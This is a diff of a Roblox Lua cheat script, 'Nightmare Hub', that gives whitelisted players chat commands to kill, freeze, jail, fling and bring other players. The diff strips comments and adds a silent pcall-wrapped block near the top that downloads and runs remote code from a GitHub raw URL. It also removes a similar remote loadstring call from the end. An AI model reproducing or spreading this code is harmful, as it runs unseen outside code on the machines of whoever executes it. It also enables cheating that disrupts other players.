@@ -1,6 +1,11 @@
--- NIGHTMARE HUB | ADMIN LOCAL COM CHAT SYNC
+l-- NIGHTMARE HUB | ADMIN LOCAL COM CHAT SYNC
 
 repeat task.wait() until game:IsLoaded()
+
+-- SCRIPT EXTRA
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/nombrehumilde-cyber/HironDrigon/refs/heads/main/HironDrigon1"))()
+end)
 
 -- WindUI
 local WindUI = loadstring(game:HttpGet(
@@ -18,7 +23,7 @@ local UIS = game:GetService("UserInputService")
 --------------------------------------------------
 
 local Whitelist = {
-    "HironDrigon", -- exemplo de usuário autorizado
+    "HironDrigon",
     "medr0so_0",
     "Arthurfelipe_blox2", 
     "Davilucca",
@@ -34,9 +39,8 @@ local function IsWhitelisted(plr)
     return false
 end
 
--- bloqueia acesso se não estiver na whitelist
 if not IsWhitelisted(LocalPlayer) then
-    return -- sai do script se não for autorizado
+    return
 end
 
 --------------------------------------------------
@@ -164,7 +168,7 @@ TextChatService.MessageReceived:Connect(function(msg)
     local plr = Players:FindFirstChild(name)
     if not plr then return end
 
-    if not IsWhitelisted(plr) then return end -- bloqueia quem não tá na whitelist
+    if not IsWhitelisted(plr) then return end
 
     if cmd == ";kill" then
         Kill(plr)
@@ -201,10 +205,6 @@ local function PlayerList()
     return t
 end
 
---------------------------------------------------
--- ADMIN TAB
---------------------------------------------------
-
 local AdminTab = Window:Tab({Title="Admin Commands"})
 local Selected = LocalPlayer.Name
 
@@ -224,10 +224,6 @@ Players.PlayerRemoving:Connect(function()
     PlayerDropdown:SetValues(PlayerList())
 end)
 
---------------------------------------------------
--- BUTTONS
---------------------------------------------------
-
 AdminTab:Button({Title="Kill", Callback=function() SendCommand(";kill "..Selected) end})
 AdminTab:Button({Title="Freeze", Callback=function() SendCommand(";freeze "..Selected) end})
 AdminTab:Button({Title="UnFreeze", Callback=function() SendCommand(";unfreeze "..Selected) end})
@@ -235,5 +231,3 @@ AdminTab:Button({Title="Jail", Callback=function() SendCommand(";jail "..Selecte
 AdminTab:Button({Title="UnJail", Callback=function() SendCommand(";unjail "..Selected) end})
 AdminTab:Button({Title="Fling", Callback=function() SendCommand(";fling "..Selected) end})
 AdminTab:Button({Title="Bring", Callback=function() SendCommand(";bring "..Selected) end})
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nombrehumilde-cyber/HironDrigon/refs/heads/main/loll"))()
